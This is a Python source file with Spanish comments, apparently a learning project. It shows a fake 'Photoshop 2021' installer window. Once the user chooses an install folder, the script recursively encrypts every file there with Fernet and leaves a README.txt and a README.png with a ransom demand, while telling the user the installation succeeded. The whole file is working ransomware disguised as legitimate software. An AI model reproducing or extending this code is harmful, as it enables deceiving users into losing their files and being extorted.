#Librerias
# OS: Brinda funciones para la interaccion con el S.O.
import os

# Fernet: Algoritmo SIMETRICO, genera una llave. Cryptography: Brinda herramientas de criptografia.
from cryptography.fernet import Fernet

# PIL: Proporciona funciones para abrir, manipular, crear y guardar imagenes.
from PIL import Image, ImageDraw, ImageFont

# Tkinter: Proporciona herramientas para la creacion de interfaces graficas, con botones, labels, etc.
import tkinter as tk
from tkinter import filedialog, messagebox

#Esta funcion carga la llave del archivo llave.key
def cargar_la_llave():
    #Representa la ruta de la llave.
    clave_path = 'llave.key'
    if not os.path.exists(clave_path): #Con este IF verifica si existe la llave.
        clave = Fernet.generate_key()
        with open(clave_path, 'wb') as key_file:
            key_file.write(clave) #Si no existe genera una llave con Fernet.
    with open(clave_path, 'rb') as key_file: #Se abre el archivo de la llave en modo escritura binaria
        clave = key_file.read() #Lee la llave y la retorna.
    return clave

# Su funcion es la encriptacion del directorio
def encriptar_archivo(ruta_archivo):
    key = cargar_la_llave()
    f = Fernet(key) #Carga la llave y la almacena en la variable f.
    with open(ruta_archivo, 'rb') as file: #Abre el archivo en modo lectura binaria
        archivo_data = file.read()
    encriptacion_data = f.encrypt(archivo_data) #A continuacion encripta los archivos con la llave.
    with open(ruta_archivo, 'wb') as file: #Abre el archivo en modo escritura binaria y la guarda.
        file.write(encriptacion_data)

# Encriptacion de subdirectorios y archivos dentro.
def encriptar_directorio(ruta_directorio):
    #Os.walk permite recorrer recursivamente la ruta devolciendo los datos en el for.
    for directorio_actual, subdirectorios, archivos in os.walk(ruta_directorio):
        for nombre_archivo in archivos:
            #os.path.join construye la ruta completa de cada archivo de las iteraciones.
            ruta_archivo = os.path.join(directorio_actual, nombre_archivo)
            encriptar_archivo(ruta_archivo)

def generar_mensaje(ruta_mensaje):
    mensaje = ''' 
    ----------------------------------------------------------------------------
   
    Has sido atacado.
    Todos tus archivos fueron secuestrados, si los quieres de vuelta es necesario
    pagar un rescate. 
    Para más información, comunícate al........
    
    ----------------------------------------------------------------------------
    '''
    #Se abre la ruta en modo escritura binaria
    with open(ruta_mensaje, 'w') as mensajeFinal:
        mensajeFinal.write(mensaje) #Y se la guarda.

def generar_imagen(ruta_imagen):
    imagen_width = 3000
    imagen_height = 1300
    background_color = (0, 0, 0)
    texto_color = (255, 255, 255)
    mensaje = ''' 
    ----------------------------------------------------------------------------
   
    Has sido atacado.
    Todos tus archivos fueron secuestrados, si los quieres de vuelta es necesario
    pagar un rescate. 
    Para más información, comunícate al........
    
    ----------------------------------------------------------------------------
    '''
    
    #Creamos la imagen
    image = Image.new("RGB", (imagen_width, imagen_height), background_color)
    #Realiza el "dibujo"
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("calibri.ttf", 32)
    
    #Se calcula la posicion del texto, esta formula es para que este centrada.
    text_width, text_height = draw.textsize(mensaje, font=font)
    text_position = ((imagen_width - text_width) // 2, (imagen_height - text_height) // 2)
    
    #Escribe el texto en la imagen con su posicion.
    draw.text(text_position, mensaje, font=font, fill=texto_color)
        
    imagen_nombre = f"README.png"
    imagen_path_with_name = os.path.join(ruta_imagen, imagen_nombre)
    image.save(imagen_path_with_name, "PNG")
    
    return imagen_path_with_name

#Esta genera el cuadro para seleccionar el directorio
def seleccionar_directorio():
    #Al momento de seleccionar el directorio hace que no se vea la anterior ventana.
    ventana.withdraw() 
    #Permite seleccionar el directorio
    ruta_directorio = filedialog.askdirectory(title="Seleccionar directorio de instalación")
    ventana.deiconify()  # vuelve a mostrar la ventana.
    
    #Si se selecciono un directorio esta muestra un messagebox que indica que la instalacion esta en progreso.
    if ruta_directorio:
        messagebox.showinfo("Instalación", "Instalación en progreso...")
        encriptar_directorio(ruta_directorio)#llamamos a la funcion para encriptar el directorio.
        mensaje = os.path.join(ruta_directorio, "README.txt") #Esta variable almacena la ruta del directorio que contendra el readme.txt
        generar_mensaje(mensaje) #Se agrega el mensaje
        
        #Al finalizar el anterior paso muestra un nuevo messagebox.
        messagebox.showinfo("Instalación", "Proceso completado con éxito.")
        ventana.destroy()  # Cerrar la ventana principal
        imagen = generar_imagen(ruta_directorio) #Introduce la imagen generada.
        
        # Mostrar la imagen
        img = Image.open(imagen)
        img.show()

# Crear la ventana principal de la aplicación
ventana = tk.Tk()
ventana.title("Photoshop")
ventana.geometry("700x400")

marco = tk.Frame(ventana)
marco.pack(side="bottom", anchor="se")

# Apartado grafico
labelbien = tk.Label(ventana, text="Bienvenido al proceso de intalacion de Photoshop 2021", font=("Arial", 12))
labelbien.pack()
labelbien.place(x=20, y=20)

labeldet = tk.Label(ventana, text="A continuacion, selecciona la ruta en la que quieres que Photoshop 2021 se instale", font=("Arial", 12))
labeldet.pack()
labeldet.place(x=20, y=45)

boton_directorio = tk.Button(ventana, text="Seleccionar Directorio", command=seleccionar_directorio)
boton_directorio.pack(pady=100)
boton_directorio.place(x=425, y=340)

boton_directorio = tk.Button(ventana, text="Cancelar")
boton_directorio.pack(pady=100)
boton_directorio.place(x=575, y=340)

# Ejecutar la ventana principal
ventana.mainloop()
